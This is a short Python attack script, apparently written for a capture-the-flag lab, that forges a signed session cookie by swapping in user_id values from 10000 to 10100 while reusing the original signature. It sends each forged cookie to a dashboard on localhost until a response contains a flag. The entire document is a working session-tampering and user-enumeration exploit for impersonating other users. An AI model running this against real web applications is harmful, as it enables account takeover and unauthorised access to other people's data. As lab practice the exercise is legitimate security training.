import base64, json, requests

TARGET = "http://127.0.0.1:33187/dashboard"
COOKIE_ORIG = "eyJ1c2VyX2lkIjoiMTAwMzIifQ.aVd0oA.VqPUgS4MLdLZbrF9JRNetU8FfwI"

for uid in range(10000, 10101):
    try:
        parts = COOKIE_ORIG.split('.')
        payload_b64 = base64.b64encode(json.dumps({'user_id':str(uid)}).encode()).decode()
        modified_cookie = f"{payload_b64}.{parts[1]}.{parts[2]}"
        
        resp = requests.get(TARGET, cookies={'session':modified_cookie}, timeout=8)
        
        if 'FLAG{' in resp.text:
            start = resp.text.index('FLAG{')
            end = resp.text.index('}', start)
            flag = resp.text[start:end+1]
            print(f"FLAG: {flag} (uid={uid})")
            exit()
            
    except Exception as e:
        continue

print("No flag found")
